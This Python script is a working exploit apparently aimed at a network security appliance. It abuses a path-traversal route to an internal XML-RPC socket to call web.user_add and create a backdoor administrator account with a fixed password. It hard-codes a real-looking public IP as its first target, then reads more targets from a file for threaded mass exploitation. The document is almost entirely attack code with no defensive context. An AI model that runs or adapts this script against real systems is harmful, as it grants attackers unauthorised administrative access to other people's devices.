import requests,threading,os,urllib3
from concurrent.futures import ThreadPoolExecutor
from pathlib import Path
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

#fofa: 
headers = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36 Edg/113.0.1774.35',
}
filename = Path(__file__).name.strip('.py')
line_break = '\n'
file_path=Path(__file__).resolve().parent
result_path=file_path/'result'/f'{filename}.txt'

proxy={
    'http':'http://127.0.0.1:8080',
    'https':'http://127.0.0.1:8080'
}
def exploit(ip_, index):
    try:
        url = f"{ip_}/service/?unix:/../../../../var/run/rpc/xmlrpc.sock/|http://test/wsrpc"
        
        payload = "<?xml version=\"1.0\"?>\r\n<methodCall>\r\n<methodName>web.user_add</methodName>\r\n<params>\r\n<param>\r\n<value>\r\n<array>\r\n<data>\r\n<value>\r\n<string>admin</string>\r\n</value>\r\n<value>\r\n<string>5</string>\r\n</value>\r\n<value>\r\n<string>10.0.0.1</string>\r\n</value>\r\n</data>\r\n</array>\r\n</value>\r\n</param>\r\n<param>\r\n<value>\r\n<struct>\r\n<member>\r\n<name>uname</name>\r\n<value>\r\n<string>test</string>\r\n</value>\r\n</member>\r\n<member>\r\n<name>name</name>\r\n<value>\r\n<string>test</string>\r\n</value>\r\n</member>\r\n<member>\r\n<name>pwd</name>\r\n<value>\r\n<string>1qaz@3edC12345</string>\r\n</value>\r\n</member>\r\n<member>\r\n<name>authmode</name>\r\n<value>\r\n<string>1</string>\r\n</value>\r\n</member>\r\n<member>\r\n<name>deptid</name>\r\n<value>\r\n<string></string>\r\n</value>\r\n</member>\r\n<member>\r\n<name>email</name>\r\n<value>\r\n<string></string>\r\n</value>\r\n</member>\r\n<member>\r\n<name>mobile</name>\r\n<value>\r\n<string></string>\r\n</value>\r\n</member>\r\n<member>\r\n<name>comment</name>\r\n<value>\r\n<string></string>\r\n</value>\r\n</member>\r\n<member>\r\n<name>roleid</name>\r\n<value>\r\n<string>102</string>\r\n</value>\r\n</member>\r\n</struct></value>\r\n</param>\r\n</params>\r\n</methodCall>\r\n"

        h={
            # "Host":ip_,
            "Cache-Control": "max-age=0",
            "Sec-Ch-Ua": '" Not A;Brand";v="99", "Chromium";v="100", "Google Chrome";v="100"',
            "Sec-Ch-Ua-Mobile": "?0",
            "Sec-Ch-Ua-Platform": "Windows",
            "Upgrade-Insecure-Requests": "1",
            "Cookie":"LANG=zh; DBAPPUSM=ee4bbf6c85e541bb980ad4e0fbee2f57bb15bafe20a7028af9a0b8901cf80fd3",
            "Content-Type": "application/x-www-form-urlencoded",
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
            "Sec-Fetch-Site": "same-origin",
            "Sec-Fetch-Mode": "navigate",
            "Sec-Fetch-User": "?1",
            "Sec-Fetch-Dest": "document",
            "Accept-Encoding": "gzip, deflate",
            "Accept-Language": "zh-CN,zh;q=0.9",
            "Connection": "close",
        }
        
    
        headers.update(h)
        # print(headers)
        print(url)
        res = requests.post(url,data=payload, proxies=proxy,headers=headers, timeout=8, verify=False)
        print(res.request.path_url)
        print(f'{res} {len(res.text)} \n{index} {ip_}\n {res.text}\n')

    except Exception as e:
        # print(e)
        pass

url='https://118.122.16.11:30443'
exploit(url,1)


threads = []
with open(r'D:\Downloads\tmp\ming.txt', 'r') as file:
    # with result_path.open('r') as file:
    urls = []
    for index, line in enumerate(file):
        start = 0
        end = start+2

        if index >= start and index <= end:
            urls.append(line.strip(line_break))
            ip = line.strip(line_break)
            print(index, ip)
            # exploit(ip,index)

            thread = threading.Thread(target=exploit, args=(ip, index,))
            threads.append(thread)
pool_size = 20
# print(urls)

test = 'mt'

if test=='m':
    for thread in threads:
        thread.start()

    for thread in threads:
        thread.join()
elif test=='m':
    # 创建线程池
    with ThreadPoolExecutor(max_workers=pool_size) as executor:
        # 提交每个 URL 的请求任务
        futures = [executor.submit(exploit, url, index)
                   for index, url in enumerate(urls)]

        # 获取每个请求的结果
        for future in futures:
            result = future.result()